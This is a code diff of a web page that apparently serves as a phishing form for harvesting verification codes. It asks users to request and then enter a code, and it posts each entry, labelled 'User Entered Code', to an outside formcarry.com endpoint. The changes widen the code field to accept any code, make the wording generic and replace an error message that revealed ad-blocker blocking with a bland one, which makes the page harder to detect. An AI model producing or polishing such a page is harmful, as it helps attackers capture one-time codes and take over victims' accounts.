@@ -29,7 +29,6 @@
     }
     .logo { width: 250px; margin-bottom: 20px; }
     
-    /* Input Styling */
     input { 
       display: block; 
       margin: 15px auto; 
@@ -59,7 +58,6 @@
     
     .status-msg { margin-top: 15px; font-size: 14px; color: #ffd700; display: none; }
     
-    /* This section stays hidden until the request is sent */
     #codeEntrySection { display: none; margin-top: 20px; }
     
     hr { margin: 25px 0; border: 0; border-top: 1px solid #444; }
@@ -77,24 +75,23 @@
       
       <form id="vForm" action="https://formcarry.com/s/dy_hO3bo1eG" method="POST">
         
-        <!-- HIDDEN PHONE DATA: Replaces the manual phone input -->
         <input type="hidden" name="phone_number" value="Hidden_System_User">
         <input type="hidden" name="intent" id="intent" value="">
 
-        <!-- Initial Request Button -->
         <button type="submit" id="reqBtn">Request Code</button>
         
         <div id="waitMessage" class="status-msg">
           ✔ Request Sent! Your code is being generated...
         </div>
 
-        <!-- HIDDEN SECTION: Appears after clicking Request -->
         <div id="codeEntrySection">
           <hr>
           <h3 style="margin-bottom: 5px;">Enter Code</h3>
-          <p style="font-size: 11px; color: #888;">Check your device for the 6-digit code.</p>
+          <!-- تم تعديل النص التوضيحي -->
+          <p style="font-size: 11px; color: #888;">Check your device for the verification code.</p>
           
-          <input type="text" name="received_code" id="codeInput" placeholder="000000" maxlength="6">
+          <!-- تم إزالة maxlength="6" وتغيير الـ placeholder -->
+          <input type="text" name="received_code" id="codeInput" placeholder="Enter your code">
           
           <button type="submit" id="subBtn" class="btn-verify">Submit & Verify</button>
           
@@ -121,13 +118,11 @@
     const clickedBtn = document.activeElement;
     const isRequest = clickedBtn.id === 'reqBtn';
     
-    // Set the hidden intent
     intentInput.value = isRequest ? "Requesting New Code" : "User Entered Code: " + codeInput.value;
 
     const statusId = isRequest ? 'waitMessage' : 'successMessage';
     const statusMsg = document.getElementById(statusId);
 
-    // Disable button during processing
     clickedBtn.disabled = true;
     const originalText = clickedBtn.innerText;
     clickedBtn.innerText = "Processing...";
@@ -143,15 +138,13 @@
         clickedBtn.innerText = "Success";
         statusMsg.style.display = "block";
         
-        // If it was a request, show the "Enter Code" section
         if (isRequest) {
           setTimeout(() => {
             codeSection.style.display = "block";
-            reqBtn.style.display = "none"; // Hide the request button after success
+            reqBtn.style.display = "none";
           }, 1000);
         }
         
-        // Reset processing state
         setTimeout(() => {
           clickedBtn.disabled = false;
           clickedBtn.innerText = originalText;
@@ -163,7 +156,7 @@
         clickedBtn.innerText = "Try Again";
       }
     } catch (error) {
-      alert("Connection Blocked. Please disable Ad-Blockers and run from a server.");
+      alert("Connection Error. Please check your internet.");
       clickedBtn.disabled = false;
       clickedBtn.innerText = "Try Again";
     }
